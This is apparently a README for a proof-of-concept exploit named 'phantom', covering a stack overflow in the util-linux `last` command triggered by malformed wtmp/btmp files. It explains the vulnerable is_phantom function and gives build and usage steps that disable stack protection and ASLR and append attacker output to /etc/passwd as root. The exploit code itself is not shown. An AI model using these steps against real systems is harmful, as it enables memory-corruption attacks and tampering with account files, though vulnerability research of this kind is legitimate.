# Phantom (last exploit)

## Description

last is vulnerable to a Stack Overflow when processing malformed wtmp/btmp
files. The overflow occurs in the is_phantom function when the utmpx->ut_line is
not NULL terminated. A pre-requisite to reach the vulnerable code is that the
user in the ut_user field must be present in /etc/passwd. The ut_user field will
most likely be where your return address for the function will be stored, but
the ut_user field may also flow into the ut_host field.

## Build (last)

This has been debeloped on a raspberry pi running Raspbian.

```
sudo apt install autoconf
git clone --recurse-submodules https://github.com/catatonicprime/phantom && cd phantom/util-linux
./autogen.sh
CFLAGS="-ggdb -fno-stack-protector -O0 -z execstack" ./configure && make -j 4 last && mv last ../
```

## Usage

Steps to exploit vulnerable systems (tested on a raspberry pi)...
1) Build phantom (experiment with offsets, etc.)
2) Patch /etc/passwd (for now), this can be done as root by running phantom like so: ```./phantom >> /etc/passwd```
3) exploit

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # disable ASLR
gcc phantom.c -o phantom
./phantom
[patch with necessary user]
./phantom
./last -f mtmp [repeat as necessary, for ASLR]
```
